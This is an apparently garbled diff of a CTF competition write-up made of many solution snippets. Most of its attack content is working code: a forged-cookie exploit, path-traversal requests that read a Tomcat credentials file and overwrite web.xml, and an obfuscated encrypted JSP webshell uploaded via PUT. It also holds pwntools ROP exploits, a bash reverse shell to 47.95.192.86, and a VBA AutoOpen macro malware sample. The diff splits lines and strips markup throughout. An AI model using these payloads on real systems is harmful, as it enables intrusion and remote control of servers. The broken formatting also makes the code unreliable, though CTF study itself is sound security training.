@@ -49,7 +49,8 @@ def lyrics():
     try:
         with open(path) as f:
             res = f.read()
-    except Exception as e:
+    
+except Exception as e:
         return "No lyrics found"
     return res
 
@@ -232,7 +233,8 @@ def lyrics():
     try:
         with open(path) as f:
             res = f.read()
-    except Exception as e:
+    
+except Exception as e:
         return "No lyrics found"
     return res
 
@@ -267,11 +269,6 @@ def board():
 if __name__ == "__main__":
     os.chdir(os.path.dirname(__file__))
     app.run(host="0.0.0.0", port=8080)
-```
-
-
-
-```
 import base64
 import hashlib
 import hmac
@@ -362,28 +359,20 @@ o.'''
 secret="EnjoyThePlayTime123456"
 exp = touni(cookie_encode(('user', opcode), secret))
 print(exp)
-```
-
-
-
-```
 GET /myapp/read?filename=conf%2Ftomcat-users.xml HTTP/1.1
-Host: 139.155.126.78:39638
+Host: 139.155.126.78:
+39638
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://139.155.126.78:39638/myapp/read.html
+Referer: http://139.155.126.78:
+39638/myapp/read.html
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
 Cookie: JSESSIONID=B4EDC9F55155A288CBA40BDDD4435FB5; JSESSIONID=84F61594500171D149C871C6F7B54415
 Connection: keep-alive
-```
-
-
-
-```
 HTTP/1.1 200 
 Content-Type: text/html;charset=ISO-8859-1
 Content-Length: 2780
@@ -399,7 +388,8 @@ Connection: keep-alive
   contributor license agreements.  See the NOTICE file distributed with
   this work for additional information regarding copyright ownership.
   The ASF licenses this file to You under the Apache License, Version 2.0
-  (the "License"); you may not use this file except in compliance with
+  (the "License"); you may not use this file 
+except in compliance with
   the License.  You may obtain a copy of the License at
 
       http://www.apache.org/licenses/LICENSE-2.0
@@ -411,8 +401,10 @@ Connection: keep-alive
   limitations under the License.
 -->
 <tomcat-users xmlns="http://tomcat.apache.org/xml"
-              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+              xmlns:
+xsi="http://www.w3.org/2001/XMLSchema-instance"
+              xsi:
+schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
               version="1.0">
 <!--
   By default, no user is included in the "manager-gui" role required
@@ -431,7 +423,7 @@ Connection: keep-alive
   will also need to set the passwords to something appropriate.
 -->
 
-  <user username="admin" password="This_is_my_favorite_passwd" roles="manager-gui"/>
+  
 
 <!--
   The sample user and role entries below are intended for use with the
@@ -443,26 +435,24 @@ Connection: keep-alive
 <!--
   <role rolename="tomcat"/>
   <role rolename="role1"/>
-  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
-  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
-  <user username="role1" password="<must-be-changed>" roles="role1"/>
+  " roles="tomcat"/>
+  " roles="tomcat,role1"/>
+  " roles="role1"/>
 -->
 </tomcat-users>
-```
-
-
-
-```
 POST /myapp/upload?path=../../../../opt/tomcat/conf HTTP/1.1
-Host: 139.155.126.78:39638
+Host: 139.155.126.78:
+39638
 Content-Length: 2114
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://139.155.126.78:39638
+Origin: http://139.155.126.78:
+39638
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4YDaOFFwGAGYlssW
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://139.155.126.78:39638/myapp/upload.html
+Referer: http://139.155.126.78:
+39638/myapp/upload.html
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
 Cookie: JSESSIONID=B4EDC9F55155A288CBA40BDDD4435FB5; JSESSIONID=C38DB2C9E431FC5D7C48A66903371EB4
@@ -474,71 +464,71 @@ Content-Type: text/xml
 
 <?xml version="1.0" encoding="UTF-8"?>
 <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
-         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
+         xmlns:
+xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:
+schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                              http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
          version="3.1">
         <servlet>
             <servlet-name>default</servlet-name>
             <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
-            <init-param>
-                <param-name>debug</param-name>
-                <param-value>0</param-value>
-            </init-param>
-            <init-param>
-                <param-name>listings</param-name>
-                <param-value>false</param-value>
-            </init-param>
+            
+                debug
+                0
+            
+            
+                listings
+                false
+            
             <!-- 允许 PUT 和 DELETE 请求 -->
-            <init-param>
-                <param-name>readonly</param-name>
-                <param-value>false</param-value>
-            </init-param>
+            
+                readonly
+                false
+            
             <load-on-startup>1</load-on-startup>
         </servlet>
 
         <servlet-mapping>
             <servlet-name>default</servlet-name>
-            <url-pattern>/</url-pattern>
+            /
         </servlet-mapping>
     <servlet>
     <servlet-name>jsp</servlet-name>
     <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
-    <init-param>
-        <param-name>fork</param-name>
-        <param-value>false</param-value>
-    </init-param>
-    <init-param>
-        <param-name>mappedfile</param-name>
-        <param-value>false</param-value>
-    </init-param>
-    <init-param>
-        <param-name>xpoweredBy</param-name>
-        <param-value>false</param-value>
-    </init-param>
+    
+        fork
+        false
+    
+    
+        mappedfile
+        false
+    
+    
+        xpoweredBy
+        false
+    
     <load-on-startup>3</load-on-startup>
 </servlet>
          <servlet-mapping>
             <servlet-name>jsp</servlet-name>
-            <url-pattern>*.txt</url-pattern>
+            *.txt
         </servlet-mapping>
 </web-app>
 ------WebKitFormBoundary4YDaOFFwGAGYlssW--
-```
-
-
-
-```
 POST /myapp/upload?path=../../../../opt/tomcat/conf HTTP/1.1
-Host: 139.155.126.78:39638
+Host: 139.155.126.78:
+39638
 Content-Length: 2114
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://139.155.126.78:39638
+Origin: http://139.155.126.78:
+39638
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4YDaOFFwGAGYlssW
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://139.155.126.78:39638/myapp/upload.html
+Referer: http://139.155.126.78:
+39638/myapp/upload.html
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
 Cookie: JSESSIONID=B4EDC9F55155A288CBA40BDDD4435FB5; JSESSIONID=C38DB2C9E431FC5D7C48A66903371EB4
@@ -550,89 +540,78 @@ Content-Type: text/xml
 
 <?xml version="1.0" encoding="UTF-8"?>
 <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
-         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
+         xmlns:
+xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:
+schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                              http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
          version="3.1">
         <servlet>
             <servlet-name>default</servlet-name>
             <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
-            <init-param>
-                <param-name>debug</param-name>
-                <param-value>0</param-value>
-            </init-param>
-            <init-param>
-                <param-name>listings</param-name>
-                <param-value>false</param-value>
-            </init-param>
+            
+                debug
+                0
+            
+            
+                listings
+                false
+            
             <!-- 允许 PUT 和 DELETE 请求 -->
-            <init-param>
-                <param-name>readonly</param-name>
-                <param-value>false</param-value>
-            </init-param>
+            
+                readonly
+                false
+            
             <load-on-startup>1</load-on-startup>
         </servlet>
 
         <servlet-mapping>
             <servlet-name>default</servlet-name>
-            <url-pattern>/</url-pattern>
+            /
         </servlet-mapping>
 
 </web-app>
 
 ------WebKitFormBoundary4YDaOFFwGAGYlssW--
-```
-
-
-
-```
 PUT /2.txt HTTP/1.1
-Host: 139.155.126.78:39638
+Host: 139.155.126.78:
+39638
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://139.155.126.78:39638
+Origin: http://139.155.126.78:
+39638
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://139.155.126.78:39638/myapp/upload.html
+Referer: http://139.155.126.78:
+39638/myapp/upload.html
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
 Cookie: JSESSIONID=B4EDC9F55155A288CBA40BDDD4435FB5; JSESSIONID=C38DB2C9E431FC5D7C48A66903371EB4
 Connection: keep-alive
 Content-Length: 1922
 
-<%! public byte[] AQUdM(String Strings,String k) throws Exception { javax.crypto.Cipher B4316j = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");B4316j.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName("javax.crypto.spec.SecretKeySpec").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), "AES"));byte[] bytes;try{int[] aa = new int[]{122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String ccstr = "";for (int i = 0; i < aa.length; i++) { aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr); Object decoder = clazz.getMethod("getDecoder").invoke(null);bytes =  (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, Strings);}catch (Throwable e){int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = "";for (int i = 0; i < aa.length; i++) {aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr);bytes = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), Strings);}byte[] result = (byte[]) B4316j.getClass()./*Z5BB7988x4*/getDeclaredMethod/*Z5BB7988x4*/("doFinal", new Class[]{byte[].class}).invoke(B4316j,new Object[]{bytes});return result;} %><%  try {  String K23u86W = "1a1dc91c907325c6";  session.putValue("u", K23u86W);  byte[] I0A0072 = AQUdM (request.getReader().readLine(),K23u86W);  java./*Z5BB7988x4*/lang./*Z5BB7988x4*/reflect.Method AQUdM = Class.forName("java.lang.ClassLoader").getDeclaredMethod/*Z5BB7988x4*/("defineClass",byte[].class,int/**/.class,int/**/.class);  AQUdM.setAccessible(true);  Class i = (Class)AQUdM.invoke(Thread.currentThread()./*Z5BB7988x4*/getContextClassLoader(), I0A0072 , 0, I0A0072.length);  Object Q676 = i./*Z5BB7988x4*/newInstance();  Q676.equals(pageContext); } catch (Exception e) {} %>
-```
-
-
-
-```
+<%! public byte[] AQUdM(String Strings,String k) throws Exception { javax.crypto.Cipher B4316j = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");B4316j.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName("javax.crypto.spec.SecretKeySpec").getConstructor(byte[].class, String.class).newInstance(k.getBytes(), "AES"));byte[] bytes;try{int[] aa = new int[]{122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String ccstr = "";for (int i = 0; i < aa.length; i++) { aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr); Object decoder = clazz.getMethod("getDecoder").invoke(null);bytes =  (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, Strings);}catch (Throwable e){int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String ccstr = "";for (int i = 0; i < aa.length; i++) {aa[i] = aa[i] ^ 0x010;ccstr = ccstr + (char) aa[i];}Class clazz = Class.forName(ccstr);bytes = (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), Strings);}byte[] result = (byte[]) B4316j.getClass()./*Z5BB7988x4*/getDeclaredMethod/*Z5BB7988x4*/("doFinal", new Class[]{byte[].class}).invoke(B4316j,new Object[]{bytes});
+return result;} %><%  try {  String K23u86W = "1a1dc91c907325c6";  session.putValue("u", K23u86W);  byte[] I0A0072 = AQUdM (request.getReader().readLine(),K23u86W);  java./*Z5BB7988x4*/lang./*Z5BB7988x4*/reflect.Method AQUdM = Class.forName("java.lang.ClassLoader").getDeclaredMethod/*Z5BB7988x4*/("defineClass",byte[].class,int/**/.class,int/**/.class);  AQUdM.setAccessible(true);  Class i = (Class)AQUdM.invoke(Thread.currentThread()./*Z5BB7988x4*/getContextClassLoader(), I0A0072 , 0, I0A0072.length);  Object Q676 = i./*Z5BB7988x4*/newInstance();  Q676.equals(pageContext); } catch (Exception e) {} %>
 GET /2.txt HTTP/1.1
-Host: 139.155.126.78:39638
+Host: 139.155.126.78:
+39638
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://139.155.126.78:39638
+Origin: http://139.155.126.78:
+39638
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://139.155.126.78:39638/myapp/upload.html
+Referer: http://139.155.126.78:
+39638/myapp/upload.html
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
 Cookie: JSESSIONID=B4EDC9F55155A288CBA40BDDD4435FB5; JSESSIONID=C38DB2C9E431FC5D7C48A66903371EB4
 Connection: keep-alive
-```
-
-
-
-```
 file://localhost/ffffffllllllaaaaagggggggg
-```
-
-
-
-```
 from pwn import*
 context(arch='amd64', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 libc = ELF("./libc.so.6")
 """""
 def xxx():
@@ -672,11 +651,6 @@ payload =p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))  + p64(libc.sym
 p.send(payload)
 
 p.interactive()
-```
-
-
-
-```
 from pwn import*
 context(arch='amd64', os='linux',log_level="debug")
 libc = ELF("./libc.so.6")
@@ -811,15 +785,10 @@ def attack():
 leak()
 attack()
 p.interactive()
-```
-
-
-
-```
 from pwn import*
 context(arch='i386', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 # libc = ELF("./libc-so.6")
 """""
 def xxx():
@@ -848,15 +817,10 @@ p.sendline(request)
 sleep(2)
 p.sendline('bash -c "bash -i >& /dev/tcp/47.95.192.86/2333 0>&1"')
 p.interactive()
-```
-
-
-
-```
 from pwn import*
 context(arch='i386', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 # libc = ELF("./libc-so.6")
 """""
 def xxx():
@@ -886,11 +850,6 @@ payload = b"A"*0x70 + p64(0x404200) + p64(0x0401BC7)
 p.sendafter("Type your message here plz: ",payload)
 # gdb.attach(p,"")
 p.interactive()
-```
-
-
-
-```
 import itertools
 import string
 from concurrent.futures import ThreadPoolExecutor
@@ -974,18 +933,14 @@ class BruteForceCracker:
 if __name__ == '__main__':
     cracker = BruteForceCracker()
     found_key = cracker.run()
-```
-
-
-
-```
 void __cdecl Test::~Test(Test *const this)
 {
   int i; // [esp+2Ch] [ebp-Ch]
 
   for ( i = 0; i <= 32; ++i )
   {
-    if ( std::abs(check[i] - in[i]) > (long double)(double)0.0001 )
+    if ( std::
+abs(check[i] - in[i]) > (long double)(double)0.0001 )
     {
       puts("Wrong!!");
       exit(0);
@@ -993,104 +948,172 @@ void __cdecl Test::~Test(Test *const this)
   }
   puts("Right!!");
 }
-```
-
-
-
-```
 void __cdecl __static_initialization_and_destruction_0(int __initialize_p, int __priority)
 {
-  std::ios_base::Init *v2; // [esp+0h] [ebp-18h]
-  std::vector<double> *const v3; // [esp+0h] [ebp-18h]
+  std::
+ios_base::
+Init *v2; // [esp+0h] [ebp-18h]
+  std::
+vector<double> *const v3; // [esp+0h] [ebp-18h]
   Test *const v4; // [esp+0h] [ebp-18h]
   Test2 *const v5; // [esp+0h] [ebp-18h]
 
   if ( __initialize_p == 1 && __priority == 0xFFFF )
   {
-    std::ios_base::Init::Init(v2);
+    std::
+ios_base::
+Init::
+Init(v2);
     atexit(__tcf_0);
-    std::vector<double>::vector(v3);
+    std::
+vector<double>::
+vector(v3);
     atexit(__tcf_1);
-    Test::Test(v4);                             // len(input) == 33
+    Test::
+Test(v4);                             // len(input) == 33
     atexit(__tcf_2);
-    Test2::Test2(v5);                           // ROT13
+    Test2::
+Test2(v5);                           // ROT13
     atexit(__tcf_3);
   }
 }
-```
-
-
-
-```
 void __cdecl Test2::~Test2(Test2 *const this)
 {
-  std::vector<int> *v1; // eax
+  std::
+vector *v1; // eax
   char v2; // bl
   int v3; // eax
-  std::allocator<int> *v4; // [esp+0h] [ebp-68h]
-  std::allocator<int> *const v5; // [esp+0h] [ebp-68h]
-  std::vector<double> *const v6; // [esp+0h] [ebp-68h]
-  std::vector<double> *const v7; // [esp+0h] [ebp-68h]
-  std::vector<double> *const v8; // [esp+0h] [ebp-68h]
-  __gnu_cxx::__normal_iterator<double*,std::vector<double> > *v9; // [esp+0h] [ebp-68h]
-  __gnu_cxx::__normal_iterator<double*,std::vector<double> > *const v10; // [esp+0h] [ebp-68h]
-  std::vector<int>::size_type v11; // [esp+4h] [ebp-64h]
-  std::vector<double> *v12; // [esp+4h] [ebp-64h]
-  const std::vector<int>::allocator_type *v13; // [esp+8h] [ebp-60h]
-  std::vector<double>::iterator __for_end; // [esp+24h] [ebp-44h] BYREF
-  std::vector<double>::iterator __for_begin; // [esp+28h] [ebp-40h] BYREF
-  std::vector<int> input; // [esp+2Ch] [ebp-3Ch] BYREF
-  std::vector<int>::size_type __n[3]; // [esp+3Bh] [ebp-2Dh] BYREF
+  std::
+allocator *v4; // [esp+0h] [ebp-68h]
+  std::
+allocator *const v5; // [esp+0h] [ebp-68h]
+  std::
+vector<double> *const v6; // [esp+0h] [ebp-68h]
+  std::
+vector<double> *const v7; // [esp+0h] [ebp-68h]
+  std::
+vector<double> *const v8; // [esp+0h] [ebp-68h]
+  __gnu_cxx::
+__normal_iterator<double*,std::
+vector<double> > *v9; // [esp+0h] [ebp-68h]
+  __gnu_cxx::
+__normal_iterator<double*,std::
+vector<double> > *const v10; // [esp+0h] [ebp-68h]
+  std::
+vector::
+size_type v11; // [esp+4h] [ebp-64h]
+  std::
+vector<double> *v12; // [esp+4h] [ebp-64h]
+  const std::
+vector::
+allocator_type *v13; // [esp+8h] [ebp-60h]
+  std::
+vector<double>::
+iterator __for_end; // [esp+24h] [ebp-44h] BYREF
+  std::
+vector<double>::
+iterator __for_begin; // [esp+28h] [ebp-40h] BYREF
+  std::
+vector input; // [esp+2Ch] [ebp-3Ch] BYREF
+  std::
+vector::
+size_type __n[3]; // [esp+3Bh] [ebp-2Dh] BYREF
   double val; // [esp+48h] [ebp-20h]
-  std::vector<double> *__for_range; // [esp+54h] [ebp-14h]
+  std::
+vector<double> *__for_range; // [esp+54h] [ebp-14h]
   int i; // [esp+58h] [ebp-10h]
   int cd; // [esp+5Ch] [ebp-Ch]
 
-  std::allocator<int>::allocator(v4);
-  v1 = (std::vector<int> *)strlen(flag);
-  std::vector<int>::vector(v1, (std::vector<int>::size_type)__n, v13);
-  std::allocator<int>::~allocator(v5);
+  std::
+allocator::
+allocator(v4);
+  v1 = (std::
+vector *)strlen(flag);
+  std::
+vector::
+vector(v1, (std::
+vector::
+size_type)__n, v13);
+  std::
+allocator::~allocator(v5);
   for ( i = 0; strlen(flag) > i; ++i )
   {
     v2 = flag[i];
-    *std::vector<int>::operator[]((std::vector<int> *const)i, v11) = v2;
+    *std::
+vector::
+operator[]((std::
+vector *const)i, v11) = v2;
   }
-  encrypt((std::vector<double> *)((char *)__n + 1), &input);// 将输入进行rot13，然后传入做离散余弦变换（DCT）
-  std::vector<double>::operator=((std::vector<double> *const)((char *)__n + 1), v12);
-  std::vector<double>::~vector(v6);
+  encrypt((std::
+vector<double> *)((char *)__n + 1), &input);// 将输入进行rot13，然后传入做离散余弦变换（DCT）
+  std::
+vector<double>::
+operator=((std::
+vector<double> *const)((char *)__n + 1), v12);
+  std::
+vector<double>::~vector(v6);
   cd = 0;
   __for_range = &encrypted;
-  LODWORD(__for_begin._M_current) = (std::vector<double>::iterator)std::vector<double>::begin(v7)._M_current;
-  LODWORD(__for_end._M_current) = (std::vector<double>::iterator)std::vector<double>::end(v8)._M_current;
-  while ( __gnu_cxx::operator!=<double *,std::vector<double>>(&__for_begin, &__for_end) )
+  LODWORD(__for_begin._M_current) = (std::
+vector<double>::
+iterator)std::
+vector<double>::
+begin(v7)._M_current;
+  LODWORD(__for_end._M_current) = (std::
+vector<double>::
+iterator)std::
+vector<double>::
+end(v8)._M_current;
+  while ( __gnu_cxx::
+operator!=<double *,std::
+vector<double>>(&__for_begin, &__for_end) )
   {
-    val = *__gnu_cxx::__normal_iterator<double *,std::vector<double>>::operator*(v9);
+    val = *__gnu_cxx::
+__normal_iterator<double *,std::
+vector<double>>::
+operator*(v9);
     v3 = cd++;
     in[v3] = val;
-    __gnu_cxx::__normal_iterator<double *,std::vector<double>>::operator++(v10);
+    __gnu_cxx::
+__normal_iterator<double *,std::
+vector<double>>::
+operator++(v10);
   }
-  std::vector<int>::~vector((std::vector<int> *const)v9);
+  std::
+vector::~vector((std::
+vector *const)v9);
 }
-```
-
-
-
-```
-std::vector<double> *__cdecl encrypt(std::vector<double> *retstr, const std::vector<int> *input)
+std::
+vector<double> *__cdecl encrypt(std::
+vector<double> *retstr, const std::
+vector *input)
 {
   long double v2; // fst7
   double *v3; // eax
   long double v4; // fst7
   double *eax9; // eax
-  const std::vector<int> *_0; // [esp+0h] [ebp-68h]
-  std::allocator<double> *const v8; // [esp+0h] [ebp-68h]
-  std::allocator<double> *const v9; // [esp+0h] [ebp-68h]
-  std::vector<int>::size_type v10; // [esp+4h] [ebp-64h]
-  std::vector<double>::size_type v11; // [esp+4h] [ebp-64h]
-  std::vector<double>::size_type v12; // [esp+4h] [ebp-64h]
-  const std::vector<double>::allocator_type *v13; // [esp+Ch] [ebp-5Ch]
+  const std::
+vector *_0; // [esp+0h] [ebp-68h]
+  std::
+allocator<double> *const v8; // [esp+0h] [ebp-68h]
+  std::
+allocator<double> *const v9; // [esp+0h] [ebp-68h]
+  std::
+vector::
+size_type v10; // [esp+4h] [ebp-64h]
+  std::
+vector<double>::
+size_type v11; // [esp+4h] [ebp-64h]
+  std::
+vector<double>::
+size_type v12; // [esp+4h] [ebp-64h]
+  const std::
+vector<double>::
+allocator_type *v13; // [esp+Ch] [ebp-5Ch]
   char __value; // [esp+2Fh] [ebp-39h] BYREF
-  std::vector<double>::value_type __value_1; // [esp+30h] [ebp-38h] BYREF
+  std::
+vector<double>::
+value_type __value_1; // [esp+30h] [ebp-38h] BYREF
   double v7; // [esp+38h] [ebp-30h]
   double v6; // [esp+40h] [ebp-28h]
   double v5; // [esp+48h] [ebp-20h]
@@ -1098,23 +1121,41 @@ std::vector<double> *__cdecl encrypt(std::vector<double> *retstr, const std
   int j; // [esp+58h] [ebp-10h]
   int i; // [esp+5Ch] [ebp-Ch]
 
-  size = std::vector<int>::size(_0);
-  std::allocator<double>::allocator(v8);
+  size = std::
+vector::
+size(_0);
+  std::
+allocator<double>::
+allocator(v8);
   __value_1 = 0.0;
-  std::vector<double>::vector(
-    (std::vector<double> *const)size,
-    (std::vector<double>::size_type)&__value_1,
-    (const std::vector<double>::value_type *)&__value,
+  std::
+vector<double>::
+vector(
+    (std::
+vector<double> *const)size,
+    (std::
+vector<double>::
+size_type)&__value_1,
+    (const std::
+vector<double>::
+value_type *)&__value,
     v13);
-  std::allocator<double>::~allocator(v9);
+  std::
+allocator<double>::~allocator(v9);
   for ( i = 0; i < size; ++i )
   {
     for ( j = 0; j < size; ++j )
     {
-      v5 = (double)*std::vector<int>::operator[]((const std::vector<int> *const)j, v10);
+      v5 = (double)*std::
+vector::
+operator[]((const std::
+vector *const)j, v10);
       v2 = cos(((long double)j + 0.5) * ((long double)i * 3.141592653589793) / (long double)size);
       v6 = v2 * v5;
-      v3 = std::vector<double>::operator[]((std::vector<double> *const)i, v11);
+      v3 = std::
+vector<double>::
+operator[]((std::
+vector<double> *const)i, v11);
       *v3 = *v3 + v6;
     }
     if ( i )
@@ -1122,21 +1163,19 @@ std::vector<double> *__cdecl encrypt(std::vector<double> *retstr, const std
     else
       v4 = sqrt(1.0 / (long double)size);
     v7 = v4;
-    eax9 = std::vector<double>::operator[]((std::vector<double> *const)i, v12);
+    eax9 = std::
+vector<double>::
+operator[]((std::
+vector<double> *const)i, v12);
     *eax9 = *eax9 * v7;
   }
   return retstr;
 }
-```
+    #include <stdio.h>
+    #include <math.h>
+    #include <stdlib.h>
 
-
-
-```
-#include <stdio.h>
-#include <math.h>
-#include <stdlib.h>
-
-#define PI 3.141592653589793
+    #define PI 3.141592653589793
 
 // 一维离散余弦变换（DCT）函数
 void dct(double *output, const double *input, int size) {
@@ -1206,11 +1245,6 @@ int main() {
 
     return 0;
 }
-```
-
-
-
-```
 flag = '54.825994 51.826012 43.826006 53.825992 44.825975 56.826027 96.825993 47.825943 90.826003 21.825981 68.825999 22.825983 75.826013 68.825986 63.825976 83.825960 22.825993 70.825993 68.826042 37.826022 70.826000 86.826046 68.825947 56.825984 77.825997 70.826023 70.826012 49.826017 68.826002 54.825998 85.825945 76.826027 98.825979'.split(' ')
 
 for _ in range(255):
@@ -1221,11 +1255,6 @@ for _ in range(255):
   print(chr(i), end="")
  print()
  print('*' * 100)
-```
-
-
-
-```
 Sub AutoOpen()
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set objShell = CreateObject("WScript.Shell")
@@ -1417,11 +1446,6 @@ Sub AutoOpen()
  End If
  Loop While isContinue = 6
 End Sub
-```
-
-
-
-```
 import itertools
 
 v9 = [
@@ -1441,17 +1465,7 @@ def find_valid_a2():
 find_valid_a2()
 
 # CFTDSA|QefX6tXcfi`buhrt&&&XE6pfubX7aXJfdu7XQ6ur2bt&&&z
-```
-
-
-
-```
 DASCTF{Vba_1s_dangerous!!!_B1ware_0f_Macr0_V1ru5es!!!}
-```
-
-
-
-```
 import csv
 import re
 
@@ -1516,11 +1530,6 @@ def read_and_reorder_csv(file_path):
 # 调用函数，读取指定路径的CSV文件并排序
 file_path = 'person_data.csv'  # 请将此处的路径替换为你要读取的CSV文件的路径
 read_and_reorder_csv(file_path)
-```
-
-
-
-```
 import json
 
 post_list = json.load(open('post.json', encoding='utf-8'))
@@ -1532,16 +1541,12 @@ for l in post_list:
         http_post_data = l['_source']['layers']['http']['http.unknown_header']
         # print(json.loads(http_post_data))
         true_list.append(json.loads(http_post_data))
-    except:
+    
+except:
         pass
 
 with open('only_data.json', 'w+') as fp:
     json.dump(true_list, fp)
-```
-
-
-
-```
 import re
 import csv
 import json
@@ -1632,7 +1637,8 @@ def validate_data(data):
     else:
         try:
             birth_date = datetime.strptime(data['birth'], "%Y%m%d")
-        except ValueError:
+        
+except ValueError:
             errors.append('birth is not a valid date.')
             exit()
         else:
@@ -1671,11 +1677,6 @@ with open('invalid.csv', 'a+', encoding='utf-8', newline='') as fp:
             pass
         else:
             csv_data.writerow(data)
-```
-
-
-
-```
 import re
 import json
 from urllib.parse import unquote
@@ -1717,7 +1718,8 @@ for log_index in range(len(error_log_list)):
         # print(error_log_list[i:i+15])
         
         item = {}
-        for _ in error_log_list[log_index:log_index+15]:
+        for _ in error_log_list[log_index:
+log_index+15]:
             # 请求体
             if 'username' in str(_):
                 req = parse_query_string(str(_).replace('\n'', ''))
@@ -1728,7 +1730,8 @@ for log_index in range(len(error_log_list)):
                     # 有密码
                     rep = re.findall(r'data-HEAP):s(.*?): (.*?)\n', _.decode())
                     rep = hex_escape_to_chinese(rep[0][0]) + ': ' + rep[0][1]
-                except:
+                
+except:
                     rep = re.findall(r'data-HEAP):s(.*?)\n', _.decode())[0]
